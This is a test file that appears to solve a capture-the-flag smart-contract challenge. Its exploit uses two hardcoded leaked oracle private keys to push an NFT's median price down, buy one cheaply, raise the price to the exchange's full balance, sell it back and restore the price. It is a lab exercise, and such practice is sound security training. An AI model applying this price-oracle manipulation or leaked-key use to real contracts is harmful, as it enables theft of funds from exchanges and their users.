...
describe('Compromised challenge', function () {
    ...
    it('Exploit', async function () {
        const initialPrice = await this.oracle.getMedianPrice('DVNFT');

        // Hex -> Base64 -> UTF-8
        const pk_1 = '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9';
        const pk_2 = '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';

        const wallet_1 = new ethers.Wallet(pk_1, ethers.provider);
        const wallet_2 = new ethers.Wallet(pk_2, ethers.provider);

        await this.oracle.connect(wallet_1).postPrice('DVNFT', 1);
        await this.oracle.connect(wallet_2).postPrice('DVNFT', 1);

        await this.exchange.connect(attacker).buyOne({ value: 1 });

        const balance = await ethers.provider.getBalance(this.exchange.address);

        await this.oracle.connect(wallet_1).postPrice('DVNFT', balance);
        await this.oracle.connect(wallet_2).postPrice('DVNFT', balance);

        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
        await this.exchange.connect(attacker).sellOne(0);

        await this.oracle.connect(wallet_1).postPrice('DVNFT', initialPrice);
        await this.oracle.connect(wallet_2).postPrice('DVNFT', initialPrice);
    });
